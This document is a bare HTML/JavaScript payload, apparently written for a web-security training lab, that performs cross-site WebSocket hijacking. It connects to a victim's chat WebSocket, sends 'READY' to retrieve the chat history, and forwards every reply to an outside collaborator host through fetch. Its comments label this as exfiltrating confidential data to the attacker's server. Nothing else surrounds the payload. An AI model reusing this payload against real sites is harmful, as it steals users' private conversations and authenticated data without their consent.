```
<script>
websocket = new WebSocket('wss://0a6b009803e4904b8069c62200210009.web-security-academy.net/chat')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
  //Exfiltrate the confidential information to attackers server
  fetch('https://wee5w86zrctv8j25vff9w7ty9pfg37rw.oastify.com/?'+event.data, {mode: 'no-cors'})
}
</script>
```
